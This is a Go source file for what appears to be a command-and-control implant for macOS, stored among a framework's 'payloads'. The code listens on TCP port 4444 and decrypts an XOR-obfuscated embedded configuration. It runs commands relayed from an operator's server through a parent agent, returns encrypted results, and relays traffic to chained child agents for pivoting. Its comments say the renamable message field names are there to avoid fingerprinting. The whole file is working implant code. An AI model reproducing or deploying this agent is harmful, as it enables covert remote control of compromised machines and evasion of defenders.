// server/docker/payloads/TCP_Darwin/main.go
// TCP-based Darwin agent that communicates via TCP sockets through a parent HTTPS agent

//go:build darwin
// +build darwin

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"
)

// Configuration variables - will be replaced at compile time via -ldflags
var (
	// XOR key for decrypting embedded values (same pattern as HTTPS agent)
	xorKey = ""

	// Embedded encrypted configuration blob (XOR encrypted with decrypted secret)
	encryptedConfig = ""

	// Initial client ID from build
	clientID = ""

	// Current sleep interval (seconds) and jitter (percentage)
	sleep  = "30"
	jitter = "10"

	// Secret for encryption (XOR encrypted with xorKey, decrypted at runtime)
	secret = ""

	// TCP port for the listener
	tcpPort = "4444"

	// TCP data transforms - embedded at build time, XOR encrypted with xorKey
	// When empty, no transforms are applied (legacy mode)
	tcpDataTransforms = ""

	// Malleable link field names - injected at build time via ldflags
	// These can be customized in config.toml to avoid structural fingerprinting
	MALLEABLE_LINK_DATA_FIELD           = "ld"
	MALLEABLE_LINK_COMMANDS_FIELD       = "lc"
	MALLEABLE_LINK_HANDSHAKE_FIELD      = "lh"
	MALLEABLE_LINK_HANDSHAKE_RESP_FIELD = "lr"
	MALLEABLE_LINK_UNLINK_FIELD         = "lu"
	MALLEABLE_ROUTING_ID_FIELD          = "r"
	MALLEABLE_PAYLOAD_FIELD             = "p"
)

// Parsed TCP transforms - initialized on first use
var parsedTCPTransforms *SMBDataBlock

// Global managers
var (
	tcpListener   *TCPListener
	commandQueue  *CommandQueue
	resultManager *ResultManager
	secureComms   *SecureComms
)

// Track transform padding lengths for current connection
var currentPrependLen, currentAppendLen int

func init() {
	// Parse embedded TCP transforms if configured
	if tcpDataTransforms != "" && xorKey != "" {
		// First Base64 decode, then XOR decrypt (matches server-side encryption)
		decoded, err := base64.StdEncoding.DecodeString(tcpDataTransforms)
		if err != nil {
			return
		}
		// Decrypt the transforms data using xorKey
		decrypted := xorDecryptBytes(decoded, []byte(xorKey))
		parsedTCPTransforms = parseSMBDataBlock(string(decrypted))
	}
}

// xorDecryptBytes decrypts data using XOR with key
func xorDecryptBytes(data, key []byte) []byte {
	if len(key) == 0 {
		return data
	}
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = b ^ key[i%len(key)]
	}
	return result
}

func main() {
	// Decrypt embedded configuration
	config, err := decryptConfig(encryptedConfig)
	if err != nil {
		os.Exit(1)
	}

	// Initialize command queue and result manager
	commandQueue = NewCommandQueue()
	resultManager = NewResultManager()

	// Get the TCP port to listen on
	activePort := tcpPort
	if configPort, ok := config["TCP Port"]; ok && configPort != "" {
		activePort = configPort
	}

	// Create the TCP listener
	tcpListener, err = NewTCPListener("0.0.0.0:" + activePort)
	if err != nil {
		os.Exit(1)
	}

	// Handle shutdown gracefully
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		tcpListener.Close()
		os.Exit(0)
	}()

	// Main loop - wait for connections from HTTPS agents
	for {
		conn, err := tcpListener.Accept()
		if err != nil {
			time.Sleep(time.Second)
			continue
		}

		// Handle connection in a goroutine
		go handleConnection(conn, config)
	}
}

func handleConnection(conn *TCPConnection, config map[string]string) {
	defer conn.Close()

	// Perform HMAC-based authentication with the connecting HTTPS agent
	// This is necessary because TCP is network-exposed (unlike local named pipes)
	if err := performAuth(conn); err != nil {
		return
	}

	// Perform handshake with the server via the parent HTTPS agent
	// Even if we already have clientID/keys, the connecting HTTPS agent needs
	// to receive our handshake data to complete the link
	if err := performHandshake(conn, config); err != nil {
		return
	}

	// Main message loop
	for {
		// Read message from HTTPS agent
		rawMessage, err := conn.ReadMessage()
		if err != nil {
			return
		}

		// Try to parse as legacy JSON format first
		var msgEnvelope struct {
			Type    string `json:"type"`
			Payload string `json:"payload"`
		}

		var messageData []byte
		var isTransformed bool

		if err := json.Unmarshal(rawMessage, &msgEnvelope); err == nil && msgEnvelope.Type != "" {
			// Successfully parsed as JSON with type field - legacy format
			isTransformed = false
			messageData = rawMessage
		} else if parsedTCPTransforms != nil && len(parsedTCPTransforms.Transforms) > 0 {
			// Not valid legacy JSON and we have transforms configured
			// Assume it's transformed data - reverse transforms to get JSON envelope
			reversed, err := reverseSMBTransforms(rawMessage, parsedTCPTransforms.Transforms, currentPrependLen, currentAppendLen)
			if err != nil {
				continue
			}

			// Parse the reversed data as JSON envelope
			if err := json.Unmarshal(reversed, &msgEnvelope); err != nil {
				continue
			}
			isTransformed = true
			messageData = reversed
		} else {
			// No transforms configured and not valid JSON - skip
			continue
		}

		// Store transform mode for response handling
		_ = isTransformed

		switch msgEnvelope.Type {
		case "data":
			handleServerData(conn, msgEnvelope.Payload)

		case "handshake_response":
			// Check for lr field that needs forwarding to children
			handleHandshakeResponseWithForwarding(messageData)

		case "link_handshake_response":
			// This is a forwarded handshake response for a child agent
			handleLinkHandshakeResponse(messageData)

		case "ping":
			// Heartbeat from parent - respond with pong to keep connection alive
			sendPong(conn)

		case "disconnect":
			return
		}

		_ = messageData
	}
}

func handleServerData(conn *TCPConnection, encryptedPayload string) {
	if secureComms == nil {
		return
	}

	// Decrypt the payload
	decrypted, err := secureComms.DecryptMessage(encryptedPayload)
	if err != nil {
		return
	}

	// Parse as JSON to check for nested link commands
	var payloadData map[string]interface{}
	if err := json.Unmarshal([]byte(decrypted), &payloadData); err != nil {
		// Legacy format - just commands array
		if err := commandQueue.AddCommands(decrypted); err != nil {
			return
		}
	} else {
		// New format - may have commands and/or link data

		// Process handshake responses for child agents FIRST (before commands)
		if linkRespVal, ok := payloadData[MALLEABLE_LINK_HANDSHAKE_RESP_FIELD]; ok {
			if linkRespData, ok := linkRespVal.([]interface{}); ok {
				processLinkHandshakeResponses(linkRespData)
			}
		}

		// Process link commands for child agents (forward to linked TCP agents)
		if linkCmdsVal, ok := payloadData[MALLEABLE_LINK_COMMANDS_FIELD]; ok {
			if linkCmdsData, ok := linkCmdsVal.([]interface{}); ok {
				processLinkCommands(linkCmdsData)
			}
		}

		// Extract commands array if present
		if cmdsVal, ok := payloadData["commands"]; ok {
			cmdsJSON, err := json.Marshal(cmdsVal)
			if err == nil {
				commandQueue.AddCommands(string(cmdsJSON))
			}
		}
	}

	// Process commands
	for {
		result, err := commandQueue.ProcessNextCommand()
		if err != nil {
			continue
		}
		if result == nil {
			break
		}
		// Add result to manager
		resultManager.AddResult(result)
	}

	// Collect link data from child TCP agents (if any)
	lm := GetLinkManager()
	linkData := lm.GetOutboundData()
	linkHandshake := lm.GetHandshakeData()
	unlinkNotifications := lm.GetUnlinkNotifications()

	hasResults := resultManager.HasResults()
	hasLinkData := len(linkData) > 0
	hasLinkHandshake := linkHandshake != nil
	hasUnlinkNotifications := len(unlinkNotifications) > 0

	// Send results back (including any link data from child agents)
	if hasResults || hasLinkData || hasLinkHandshake || hasUnlinkNotifications {
		results := resultManager.GetPendingResults()

		payload := map[string]interface{}{
			"agent_id": clientID,
		}

		if len(results) > 0 {
			payload["results"] = results
		}

		// Include link data from child agents (to be forwarded up the chain)
		if hasLinkData {
			payload[MALLEABLE_LINK_DATA_FIELD] = ConvertLinkDataToMaps(linkData)
		}

		// Include link handshake from child agents
		if hasLinkHandshake {
			payload[MALLEABLE_LINK_HANDSHAKE_FIELD] = linkHandshake.ToMalleableMap()
		}

		// Include unlink notifications from child agents
		if hasUnlinkNotifications {
			payload[MALLEABLE_LINK_UNLINK_FIELD] = unlinkNotifications
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			return
		}

		// Encrypt with our secret
		encrypted, err := secureComms.EncryptMessage(string(jsonData))
		if err != nil {
			return
		}

		// Send back through connection with transforms if configured
		if err := sendTCPResponse(conn, encrypted); err != nil {
			return
		}

		// Rotate secret
		secureComms.RotateSecret()
	} else {
		// Still need to send an empty response so parent knows we're done
		emptyPayload := map[string]interface{}{
			"agent_id": clientID,
		}
		jsonData, _ := json.Marshal(emptyPayload)
		encrypted, err := secureComms.EncryptMessage(string(jsonData))
		if err != nil {
			return
		}
		if err := sendTCPResponse(conn, encrypted); err != nil {
			return
		}
		secureComms.RotateSecret()
	}
}

// sendTCPResponse sends a response through the TCP connection
// NOTE: Transforms are NOT applied for parent-agent responses because the parent
// agent doesn't have this agent's transforms and can't reverse them.
// Transforms are only meant for HTTP server communication, not inter-agent links.
func sendTCPResponse(conn *TCPConnection, encryptedPayload string) error {
	// Create JSON envelope
	response := map[string]string{
		"type":    "data",
		"payload": encryptedPayload,
	}
	respJSON, err := json.Marshal(response)
	if err != nil {
		return err
	}

	// Write JSON directly - no transforms for parent-agent communication
	return conn.WriteMessage(respJSON)
}

// handleHandshakeResponseWithForwarding handles handshake responses that may contain
// lr data to forward to child agents (for grandchildren handshakes)
func handleHandshakeResponseWithForwarding(rawMessage []byte) {
	// Parse into map to support configurable field names
	var msgMap map[string]interface{}
	if err := json.Unmarshal(rawMessage, &msgMap); err != nil {
		return
	}

	// Check if there's handshake response data to forward using configurable field name
	if lrData, ok := msgMap[MALLEABLE_LINK_HANDSHAKE_RESP_FIELD].([]interface{}); ok && len(lrData) > 0 {
		processLinkHandshakeResponses(lrData)
	}
}

// handleLinkHandshakeResponse handles forwarded handshake responses from parent
// This is used when a grandchild agent's handshake response needs to pass through us
func handleLinkHandshakeResponse(rawMessage []byte) {
	// Parse into map to support configurable field names
	var msgMap map[string]interface{}
	if err := json.Unmarshal(rawMessage, &msgMap); err != nil {
		return
	}

	// Extract handshake responses using configurable field name
	lrData, ok := msgMap[MALLEABLE_LINK_HANDSHAKE_RESP_FIELD].([]interface{})
	if !ok || len(lrData) == 0 {
		return
	}

	// Process the lr data - forward to our children
	processLinkHandshakeResponses(lrData)
}

// processLinkCommands forwards commands from parent to linked (child) TCP agents
// and waits for responses synchronously so they can be included in the same response cycle
func processLinkCommands(linkCmds []interface{}) {
	lm := GetLinkManager()

	for _, cmd := range linkCmds {
		cmdMap, ok := cmd.(map[string]interface{})
		if !ok {
			continue
		}

		routingID, _ := cmdMap[MALLEABLE_ROUTING_ID_FIELD].(string)
		payload, _ := cmdMap[MALLEABLE_PAYLOAD_FIELD].(string)
		// Check if payload has transforms applied by server (t=true means raw bytes after base64 decode)
		transformed, _ := cmdMap["t"].(bool)

		if routingID == "" || payload == "" {
			continue
		}

		// Forward to the linked agent AND WAIT for response
		// If transformed=true, payload is base64-encoded transformed data - send as raw bytes
		response, err := lm.ForwardToLinkedAgentAndWait(routingID, payload, transformed, 30*time.Second)
		if err != nil {
			continue
		}

		if response == nil {
			continue
		}

		// Queue the response for sending back to parent
		lm.queueOutboundData(response)
	}
}

// processLinkHandshakeResponses forwards handshake responses from parent to child TCP agents
func processLinkHandshakeResponses(linkResps []interface{}) {
	lm := GetLinkManager()

	for _, resp := range linkResps {
		respMap, ok := resp.(map[string]interface{})
		if !ok {
			continue
		}

		routingID, _ := respMap[MALLEABLE_ROUTING_ID_FIELD].(string)
		payload, _ := respMap[MALLEABLE_PAYLOAD_FIELD].(string)

		if routingID == "" || payload == "" {
			continue
		}

		// Get the link
		link, exists := lm.GetLink(routingID)
		if !exists {
			continue
		}

		// Send handshake response to child TCP agent
		// Include handshake response field so child can forward to grandchildren if needed
		message := map[string]interface{}{
			"type":                              "handshake_response",
			"payload":                           payload,
			MALLEABLE_LINK_HANDSHAKE_RESP_FIELD: []interface{}{respMap},
		}

		msgJSON, err := json.Marshal(message)
		if err != nil {
			continue
		}

		// Write to the linked agent's connection
		if err := link.WriteMessage(msgJSON); err != nil {
			continue
		}
	}
}

// decryptConfig decrypts the embedded configuration
func decryptConfig(encrypted string) (map[string]string, error) {
	if encrypted == "" {
		return map[string]string{}, nil
	}

	// Decrypt the secret first
	decryptedSecret := xorDecrypt(secret, xorKey)
	if decryptedSecret == "" {
		return nil, fmt.Errorf(Err(E18))
	}

	// Now decrypt the config with the decrypted secret
	configJSON := xorDecrypt(encrypted, decryptedSecret)
	if configJSON == "" {
		return nil, fmt.Errorf(Err(E18))
	}

	var config map[string]string
	if err := json.Unmarshal([]byte(configJSON), &config); err != nil {
		return nil, fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	return config, nil
}

// sendPong sends a pong response to the parent agent
func sendPong(conn *TCPConnection) {
	response := map[string]string{
		"type": "pong",
	}
	respJSON, err := json.Marshal(response)
	if err != nil {
		return
	}

	conn.WriteMessage(respJSON)
}
